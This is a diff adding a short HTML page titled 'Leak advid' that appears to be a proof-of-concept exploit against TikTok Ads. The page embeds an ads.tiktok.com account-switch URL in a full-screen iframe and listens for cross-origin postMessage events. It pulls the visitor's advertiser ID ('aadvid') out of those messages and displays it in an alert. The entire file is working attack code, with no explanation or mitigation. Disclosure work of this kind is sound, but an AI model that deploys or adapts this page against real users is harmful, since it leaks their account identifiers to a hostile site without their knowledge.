@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Leak advid</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+<style>
+  body, html {
+    margin: 0;
+    padding: 0;
+    height: 100%;
+    overflow: hidden;
+  }
+  iframe {
+    border: none;
+    width: 100vw;
+    height: 100vh;
+    display: block;
+  }
+</style>
+</head>
+<body>
+
+<iframe 
+    id="myIframe" 
+    src="https://ads.tiktok.com/int/aegir/account/switch?redirect=https%3A%2F%2Fads.tiktok.com/i18n/statistics/viewdata">
+</iframe>
+
+<script>
+window.addEventListener("message", function(event) {
+    console.log("Received:", event.data);
+
+    const d = event.data;
+    if (!d || !d.data || d.data.type !== "query") return;
+    if (!d.data.query || !d.data.query.aadvid) return;
+
+    alert("Your ID: " + d.data.query.aadvid);
+});
+</script>
+
+</body>
+</html>
